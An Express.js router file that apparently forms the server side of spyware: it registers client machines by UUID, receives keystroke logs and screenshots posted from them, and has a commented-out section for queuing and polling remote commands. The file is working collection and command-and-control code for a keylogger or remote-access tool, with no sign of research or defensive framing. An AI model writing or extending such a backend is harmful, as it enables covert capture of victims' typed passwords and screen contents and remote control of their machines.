'use strict'

const express = require('express')
const router = express.Router()
const clientService = require('../../services/clientService')
const commandService = require('../../services/commandService')

//At clients connections
router.put('/:uuid', async (req, res, next) => {
    try {
        const { isNew, data } = await clientService.createOrUpdate({
            uuid: req.params.uuid,
            data: req.body
        })
        res.status(isNew ? 201 : 200).json(data)
    } catch (e) { next(e) }
})
/*
//At clients polling for retriving the commands list
router.get('/:uuid/commands', async (req, res, next) => {
    try {
        const commands = await commandService.getCommands(req.params.uuid)
        res.status(200).json(commands)
    } catch (e) { next(e) }
})

//At adding command
router.put('/:uuid/commands', async (req, res, next) => {
    try {
        const { isAdded, data } = await commandService.addCommand(req.params.uuid, req.body.cmd)
        res.status(isAdded ? 201 : 204).json(data)
    } catch (e) { next(e) }
})
*/
//At clients sending keylogs
router.post('/:uuid/keylogs', async (req, res, next) => {
    try {
        const { isAdded } = await clientService.addKeylogs({
            uuid: req.params.uuid,
            data: req.body
        })
        res.status(isAdded ? 201 : 304).json()
    } catch (e) { next(e) }
})

//At clients sending screenshots
router.post('/:uuid/screenshot', async (req, res, next) => {
    try {
        const { isAdded } = await clientService.addScreenshot({
            uuid: req.params.uuid,
            data: req.body
        })
        res.status(isAdded ? 201 : 304).json()
    } catch (e) { next(e) }
})

module.exports = router
